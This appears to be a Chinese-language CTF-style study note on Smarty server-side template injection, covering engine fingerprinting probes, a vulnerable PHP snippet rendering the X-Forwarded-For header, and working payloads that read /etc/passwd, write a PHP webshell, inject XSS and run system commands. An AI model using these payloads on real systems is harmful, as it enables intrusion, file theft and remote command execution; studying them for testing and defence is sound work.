
Smarty 是 PHP 的模板引擎，有助于将表示 (HTML/CSS) 与应用程序逻辑分离。在 3.1.42 和 4.0.2 版本之前，模板作者可以通过制作恶意数学字符串来运行任意 PHP 代码。如果数学字符串作为用户提供的数据传递给数学函数，则外部用户可以通过制作恶意数学字符串来运行任意 PHP 代码。

# 确定攻击方式

学了这么多SSTI对应的模板，我们现在先放一放Smarty，谈一下如何确定模板类型，从而确定我们下一步的攻击姿势：![[Pasted image 20251020194858.png]]
我们可以用三种方法来进行测试：

## 第一层：

- 如果可以执行${7_7}的结果，那我们进入第二层的`a{_comment_}b`，如果没用执行结果，那就进入第二层的`{{7_7}}`
- 在Mako模板引擎中我们也是${}形式的

## 第二层：

- 在`a{*comment*}b`中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；
- 在`{{7*7}}`中，如果能够执行，那我们进入第三层。

## 第三层：

- 当{{7*'7'}}的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型
- 当能够执行`${"z".join("ab")}`,我们就能确定是Mako模板，能够直接执行python命令.

# Smarty漏洞成因：

```php
<?php
    require_once('./smarty/libs/' . 'Smarty.class.php');
    $smarty = new Smarty();
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $smarty->display("string:".$ip);     // display函数把标签替换成对象的php变量；显示模板
}
```
这个地方对应的就是xff头处存在smarty模板，我们可以利用smarty形式来进行攻击。



#  攻击方式：


## 获取类的静态方法：

$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后，我们就去找 smarty 给我们的方法:



### getStreamVariable():-
不过这种利用方式只存在于旧版本中，而且在 3.1.30 的 Smarty 版本中官方已经将 `getStreamVariable` 静态方法删除。
```
public function getStreamVariable($variable)//variable其实就是文件路径
{
        $_result = '';
        $fp = fopen($variable, 'r+');//从此处开始对文件进行读取
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法

smarty/libs/sysplugins/smarty_internal_data.php　　——>　　getStreamVariable() 这个方法可以获取传入变量的流
例如：
{self::getStreamVariable("file:///etc/passwd")}

```
### writeFile：


```
public function writeFile($_filepath, $_contents, Smarty $smarty)
//我们可以发现第三个参数$smarty其实就是一个smarty模板类型，要求是拒绝非Smarty类型的输入，这就意味着我们需要获取对Smarty对象的引用，然后我们在smarty中找到了 self::clearConfig()：
public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}

smarty/libs/sysplugins/smarty_internal_write_file.php　　——>　　Smarty_Internal_Write_File 这个类中有一个writeFile方法

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。


## 标签：

### 1. `{$smarty.version}`

```
{$smarty.version}  #获取smarty的版本号
```

### 2.`{php}{/php}`

```
{php}phpinfo();{/php}  #执行相应的php代码
```

Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。

### 3.`{literal}`

- {literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。
- 在 PHP5 环境下存在一种 PHP 标签， `<script>language="php"></script>，`我们便可以利用这一标签进行任意的 PHP 代码执行。
- 通过上述描述也可以想到，我们完全可以利用这一种标签来实现 XSS 攻击，这一种攻击方式在 SSTI 中也是很常见的，因为基本上所有模板都会因为需要提供类似的功能。

```
{literal}alert('xss');{/literal}
```

### 4.`{if}{/if}`

```
{if phpinfo()}{/if}
```

Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如`||`，`or`，`&&`，`and`，`is_array()`等等，如：

```
{if is_array($array)}{/if}
```

还可以用来执行命令：
```
{if phpinfo()}{/if}
{if readfile ('/flag')}{/if}
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if}
```











